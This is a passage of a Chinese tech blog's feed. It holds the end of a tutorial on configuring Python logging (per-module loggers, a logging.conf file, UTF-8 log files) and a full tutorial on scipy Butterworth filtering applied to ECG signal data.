class="comment">#类方法中打印日志</span></span><br><span class="line">    testModule=TestModule()</span><br><span class="line">    testModule.print_log()  <span class="comment">#实例方法中打印日志</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/11_%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97.png" alt="其他模块中显示日志"></p><p>项目工程中所有的模块只要通过 <code>from logutils import logging</code> 引入logging就可以使用配置好的logging记录日志了。</p><h3 id="7、每个不同的模块使用不同的日志记录器记录日志"><a href="#7、每个不同的模块使用不同的日志记录器记录日志" class="headerlink" title="7、每个不同的模块使用不同的日志记录器记录日志"></a>7、每个不同的模块使用不同的日志记录器记录日志</h3><p>现在我们在所有的模块中都是用的默认的root记录器来记录的日志，实际上也可以让每个不同的模块使用不同的日志记录器记录日志。<br>日志事件信息在 LogRecord 实例中的记录器、处理器、过滤器和格式器之间传递。<br>通过调用 Logger 类（以下称为 loggers ， 记录器）的实例来执行日志记录。<br>在命名记录器时使用的一个好习惯是在每个使用日志记录的模块中使用模块级记录器，命名如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger = logging.getLogger(__name__)</span><br></pre></td></tr></table></figure><p>这意味着记录器名称跟踪包或模块的层次结构，并且直观地从记录器名称显示记录事件的位置。<br>记录器层次结构的根称为根记录器。 这是函数 debug() 、 info() 、 warning() 、 error() 和 critical() 使用的记录器，它们就是调用了根记录器的同名方法。 函数和方法具有相同的签名。 根记录器的名称在输出中打印为 ‘root’ 。<br>实际上我们只要通过 <code>logger = logging.getLogger(__name__)</code> 给每个模块定义一个记录器就可以了。<br><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> othermodule <span class="keyword">import</span> TestModule</span><br><span class="line">logger=logging.getLogger(__name__)  <span class="comment">#定义模块日志记录器</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logger.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logger.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logger.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logger.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logger.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br><span class="line">    TestModule.print_log_staic() <span class="comment">#类方法中打印日志</span></span><br><span class="line">    testModule=TestModule()</span><br><span class="line">    testModule.print_log()  <span class="comment">#实例方法中打印日志</span></span><br></pre></td></tr></table></figure><p><strong>othermodule.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line">logger=logging.getLogger(__name__) <span class="comment">#定义模块日志记录器</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestModule</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self)</span>:</span></span><br><span class="line">        logger.info(<span class="string">'this is TestModule.print_log() info'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log_staic</span><span class="params">()</span>:</span></span><br><span class="line">        logger.info(<span class="string">'this is TestModule.print_log_staic info'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/12_%E6%AF%8F%E4%B8%AA%E4%B8%8D%E5%90%8C%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%99%A8%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97.png" alt="每个不同的模块使用不同的日志记录器记录日志"><br>可以看到模块日志记录器打印出来的日志中模块名不再是默认的root，而是各自的模块名。</p><h3 id="8、通过配置文件配置日志记录器"><a href="#8、通过配置文件配置日志记录器" class="headerlink" title="8、通过配置文件配置日志记录器"></a>8、通过配置文件配置日志记录器</h3><p>在实际项目应用的过程中，通常通过配置文件来配置日志记录器的各种配置，这样的好处就是改变日志记录的配置不需要修改代码，直接修改配置文件就可以了。<br>接下来介绍如何通过配置文件配置logging日志记录器<br>新建 logging.conf 配置文件，通过如下配置将前面代码中的处理器，日志记录器，通过配置文件的方式配置好。<br> <strong>logging.conf</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[loggers]</span><br><span class="line">keys=root,logger01</span><br><span class="line"></span><br><span class="line">[logger_root]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=sh</span><br><span class="line"></span><br><span class="line">[logger_logger01]</span><br><span class="line">level=DEBUG</span><br><span class="line">handlers=sh,tfh,rfh</span><br><span class="line">qualname=logger01</span><br><span class="line">propagate=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">[handlers]</span><br><span class="line">keys=sh,tfh,rfh</span><br><span class="line"></span><br><span class="line">[handler_sh]</span><br><span class="line">class=StreamHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(sys.stderr,)</span><br><span class="line"></span><br><span class="line">[handler_tfh]</span><br><span class="line">class=handlers.TimedRotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'tfh_log.log'</span>,<span class="string">'S'</span>,<span class="number">1.5</span>,<span class="number">2</span>,)</span><br><span class="line"></span><br><span class="line">[handler_rfh]</span><br><span class="line">class=handlers.RotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'log.log'</span>,<span class="string">'a'</span>,<span class="number">1024</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">[formatters]</span><br><span class="line">keys=form01</span><br><span class="line"></span><br><span class="line">[formatter_form01]</span><br><span class="line">format=%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s</span><br></pre></td></tr></table></figure><p>在logutils.py中应用配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line">logging.config.fileConfig(<span class="string">"logging.conf"</span>)</span><br></pre></td></tr></table></figure><p>logutils.py中的代码就异常简单了，应为原来通过代码实现的配置，都写到了logging.conf配置文件中了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/12_%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%BB%A3%E7%A0%81%E4%B8%AD%E4%B8%80%E6%A0%B7%E7%9A%84%E5%8A%9F%E8%83%BD.png" alt="配置文件实现了日志代码中的功能"></p><p>这里要注意的是，在应用日志记录器的时候，需要引用配置文件中配置的记录器，如配置文件中配置了root和logger01，在应用的时候可以引用这两个记录器，当然也可以在配置文件中配置更多的记录器。<br>在mian.py和othermodule.py中应用日志记录器的时候，需要注意记录器用要配置文件中定义的记录器，这里是logger01。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger=logging.getLogger(<span class="string">'logger01'</span>)  <span class="comment">#定义模块日志记录器</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/13_%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C%E5%BC%95%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%99%A8.png" alt="定义模块日志记录器"></p><h3 id="8、日志中中文显示"><a href="#8、日志中中文显示" class="headerlink" title="8、日志中中文显示"></a>8、日志中中文显示</h3><p>当日志信息中有中文的时候，在控制台输出会自动的转码，但有时在文件输出的时候会出现乱码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/14_%E4%B8%AD%E6%96%87%E4%BF%A1%E6%81%AF%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E6%B2%A1%E9%97%AE%E9%A2%98.png" alt="中文信息控制台输出没有问题"></p><p>控制台输出中文，但日志文件中是乱码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/15_%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%B8%AD%E4%B9%B1%E7%A0%81.png" alt="日志文件中是乱码"></p><p>对照python官方说明文档设置编码，设置处理器的编码为UTF-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[handler_tfh]</span><br><span class="line">class=handlers.TimedRotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'tfh_log.log'</span>,<span class="string">'S'</span>,<span class="number">1.5</span>,<span class="number">2</span>,<span class="string">'UTF-8'</span>)</span><br><span class="line"></span><br><span class="line">[handler_rfh]</span><br><span class="line">class=handlers.RotatingFileHandler</span><br><span class="line">level=DEBUG</span><br><span class="line">formatter=form01</span><br><span class="line">args=(<span class="string">'log.log'</span>,<span class="string">'a'</span>,<span class="number">1024</span>,<span class="number">2</span>,<span class="string">'UTF-8'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/16_%E8%AE%BE%E7%BD%AE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0.png" alt="配置文件的参数"><br>现在重新执行main.py，可以看到日志文件中可以正常显示中文。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/17_%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87.png" alt="日志文件显示中文"></p><p>至此，我们从一个简单的日志记录实战，一步一步实现了自定义日志格式、写日志文件、抽出公共日志模块让其他模块用、同时写多个日志文件并进行日志文件切割、通过配置文件实现日志参数的定义、解决日志中文显示问题。基本覆盖了真实应用场景日志的使用。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、什么是日志&quot;&gt;&lt;a href=&quot;#一、什么是日志&quot; class=&quot;headerlink&quot; title=&quot;一、什么是日志&quot;&gt;&lt;/a&gt;一、什么是日志&lt;/h2&gt;&lt;p&gt;在&lt;a href=&quot;http://xiejava.ishareread.com/posts/6a8b
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python实现简单信号滤波实战</title>
    <link href="https://xiejava.gitee.io/posts/3918ce28/"/>
    <id>https://xiejava.gitee.io/posts/3918ce28/</id>
    <published>2023-03-13T07:19:26.000Z</published>
    <updated>2023-03-13T07:24:32.665Z</updated>
    
    <content type="html"><![CDATA[<p>在有些项目中需要对信号进行滤波处理，尤其是在医疗的设备中如心跳、脉搏等设备的采样后进行处理。滤波的目的就是除去某些频率的信号如噪声。常见的包括有低通滤波、高通滤波、带通滤波。</p><p>低通滤波指的是去除高于某一阈值频率的信号；高通滤波去除低于某一频率的信号；带通滤波指的是类似低通高通的结合保留中间频率信号；带阻滤波也是低通高通的结合只是过滤掉的是中间部分。通过滤波可以过滤到一些无用的噪音，得到的比较平滑的波形，用来进行分析。</p><p>scipy模块提供了常用简单的信号滤波方法包括低通滤波、高通滤波、带通滤波、带阻滤波等。</p><h2 id="一、scipy信号滤波函数介绍"><a href="#一、scipy信号滤波函数介绍" class="headerlink" title="一、scipy信号滤波函数介绍"></a>一、scipy信号滤波函数介绍</h2><ol><li>滤波器构造函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.signal.butter(N, Wn, btype=<span class="string">'low'</span>, analog=<span class="literal">False</span>, output=<span class="string">'ba'</span>)</span><br></pre></td></tr></table></figure><p> 输入参数：<br> N:滤波器的阶数<br> Wn：归一化截止频率。计算公式Wn=2*截止频率/采样频率。（注意：根据采样定理，采样频率要大于两倍的信号本身最大的频率，才能还原信号。截止频率一定小于信号本身最大的频率，所以Wn一定在0和1之间）。当构造带通滤波器或者带阻滤波器时，Wn为长度为2的列表。<br> btype : 滤波器类型{‘lowpass’, ‘highpass’, ‘bandpass’, ‘bandstop’},<br> output : 输出类型{‘ba’, ‘zpk’, ‘sos’},<br> 输出参数：<br> b，a: IIR滤波器的分子（b）和分母（a）多项式系数向量。output=’ba’<br> z,p,k: IIR滤波器传递函数的零点、极点和系统增益. output= ‘zpk’<br> sos: IIR滤波器的二阶截面表示。output= ‘sos’</p><ol start="2"><li>滤波函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.signal.filtfilt(b, a, x, axis=<span class="number">-1</span>, padtype=<span class="string">'odd'</span>, padlen=<span class="literal">None</span>, method=<span class="string">'pad'</span>, irlen=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p> 输入参数：<br> b: 滤波器的分子系数向量<br> a: 滤波器的分母系数向量<br> x: 要过滤的数据数组。（array型）<br> axis: 指定要过滤的数据数组x的轴<br> padtype: 必须是“奇数”、“偶数”、“常数”或“无”。这决定了用于过滤器应用的填充信号的扩展类型。{‘odd’, ‘even’, ‘constant’, None}<br> padlen：在应用滤波器之前在轴两端延伸X的元素数目。此值必须小于要滤波元素个数- 1。（int型或None）<br> method：确定处理信号边缘的方法。当method为“pad”时，填充信号；填充类型padtype和padlen决定，irlen被忽略。当method为“gust”时，使用古斯塔夫森方法，而忽略padtype和padlen。{“pad” ，“gust”}<br> irlen：当method为“gust”时，irlen指定滤波器的脉冲响应的长度。如果irlen是None，则脉冲响应的任何部分都被忽略。对于长信号，指定irlen可以显著改善滤波器的性能。（int型或None）<br> 输出参数：<br> y:滤波后的数据数组</p><h2 id="二、代码介绍"><a href="#二、代码介绍" class="headerlink" title="二、代码介绍"></a>二、代码介绍</h2><p>scipy模块signal滤波器类型包括低通滤波、高通滤波、带通滤波、带阻滤波</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pip install scipy</span><br><span class="line"><span class="comment">#低通滤波</span></span><br><span class="line"><span class="comment">#假设采样频率为1000hz,信号本身最大的频率为500hz，要滤除400hz以上频率成分，即截至频率为400hz,则wn=2*400/1000=0.8。Wn=0.8</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.8</span>, <span class="string">'lowpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#高通滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.2</span>, <span class="string">'highpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#带通滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, [<span class="number">0.2</span>,<span class="number">0.8</span>], <span class="string">'bandpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line"><span class="comment">#带阻滤波</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, [<span class="number">0.2</span>,<span class="number">0.8</span>], <span class="string">'bandstop'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, data)  <span class="comment">#data为要过滤的信号</span></span><br></pre></td></tr></table></figure><h2 id="三、信号滤波实战"><a href="#三、信号滤波实战" class="headerlink" title="三、信号滤波实战"></a>三、信号滤波实战</h2><p>这里以一个真实的心电数据为例，来实战对心电图某一段时间采样的信号数据进行高通滤波处理，对比一下原始的信号和高通滤波后的信号波形，然后输出成图片文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#引入包</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"><span class="comment">#读取心电图数据文件</span></span><br><span class="line">bspfile=<span class="string">'data/1.txt'</span></span><br><span class="line">bsp_f = open(bspfile, <span class="string">"r"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">bsp_content = bsp_f.read()</span><br><span class="line">ary=bsp_content.split(<span class="string">' '</span>)</span><br><span class="line">ary=[float(s) <span class="keyword">for</span> s <span class="keyword">in</span> bsp_content.split(<span class="string">' '</span>)]</span><br><span class="line">ary_data=ary[<span class="number">0</span>:<span class="number">10000</span>] <span class="comment">#取前10秒数据</span></span><br><span class="line">b, a = signal.butter(<span class="number">8</span>, <span class="number">0.3</span>, <span class="string">'highpass'</span>)   <span class="comment">#配置滤波器 8 表示滤波器的阶数</span></span><br><span class="line"><span class="comment">#绘图</span></span><br><span class="line">filtedData = signal.filtfilt(b, a, ary_data)  <span class="comment">#data为要过滤的信号</span></span><br><span class="line">fig, axes = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, figsize=(<span class="number">32</span>, <span class="number">4</span>))</span><br><span class="line">axes[<span class="number">0</span>].plot(ary_data)</span><br><span class="line">axes[<span class="number">0</span>].set(title=<span class="string">'Source signal'</span>)</span><br><span class="line">axes[<span class="number">1</span>].plot(filtedData)</span><br><span class="line">axes[<span class="number">1</span>].set(title=<span class="string">'highpass signal'</span>)</span><br><span class="line"><span class="comment">#保存图片</span></span><br><span class="line">plt.savefig(<span class="string">'./signal1.png'</span>, <span class="comment"># ⽂件名：png、jpg、pdf</span></span><br><span class="line">dpi = <span class="number">80</span>, <span class="comment"># 保存图⽚像素密度</span></span><br><span class="line">bbox_inches = <span class="string">'tight'</span>)<span class="comment"># 保存图⽚完整</span></span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230313/signal1.png" alt="心电图高通滤波后的效果"></p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><p>微信公众号：fullbug  关注微信公众号，回复“信号滤波”获取全部代码+数据集</p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在有些项目中需要对信号进行滤波处理，尤其是在医疗的设备中如心跳、脉搏等设备的采样后进行处理。滤波的目的就是除去某些频率的信号如噪声。常见的包括有低通滤波、高通滤波、带通滤波。&lt;/p&gt;
&lt;p&gt;低通滤波指的是去除高于某一阈值频率的信号；高通滤波去除低于某一频率的信号；带通滤波指
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
      <category term="数据处理" scheme="https://xiejava.gitee.io/tags/%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
</feed>
